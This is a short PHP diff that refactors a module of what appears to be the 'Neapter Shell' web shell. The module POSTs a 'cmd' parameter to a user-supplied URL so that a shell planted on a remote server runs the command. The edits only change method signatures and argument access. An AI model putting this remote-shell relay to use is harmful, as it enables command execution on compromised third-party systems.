@@ -26,7 +26,7 @@ class ModuleRemote extends ModuleAbstract
      * @access public
      * @return array
      */
-    public function getCommands()
+    public static function getCommands()
     {
         return array('remote');
     }
@@ -37,7 +37,7 @@ class ModuleRemote extends ModuleAbstract
      * @access public
      * @return string
      */
-    public function getVersion()
+    public static function getVersion()
     {
         /**
          * Wersja Data Autor
@@ -51,7 +51,7 @@ class ModuleRemote extends ModuleAbstract
      * @access public
      * @return string
      */
-    public function getHelp()
+    public static function getHelp()
     {
         return <<<DATA
 Zdalne wywołanie shella
@@ -75,8 +75,8 @@ DATA;
         /**
          * Help
          */
-        if ($this->oShell->getArgs()->getNumberOfParams() < 2) {
-            return $this->getHelp();
+        if ($this->oArgs->getNumberOfParams() < 2) {
+            return self::getHelp();
         }
 
         /**
@@ -93,11 +93,11 @@ DATA;
          */
         curl_setopt_array($rCurl, array
             (
-                CURLOPT_URL => $this->oShell->getArgs()->getParam(0),
+                CURLOPT_URL => $this->oArgs->getParam(0),
                 CURLOPT_USERAGENT => 'Neapter Shell Agent',
                 CURLOPT_ENCODING => 'gzip, deflate',
                 CURLOPT_POST => TRUE,
-                CURLOPT_POSTFIELDS => array('cmd' => $this->oShell->getArgs()->getParam(1)),
+                CURLOPT_POSTFIELDS => array('cmd' => $this->oArgs->getParam(1)),
                 CURLOPT_CONNECTTIMEOUT => 60,
                 CURLOPT_RETURNTRANSFER => TRUE,
                 CURLOPT_HTTPHEADER => array('X-Requested-With: XMLHttpRequest')
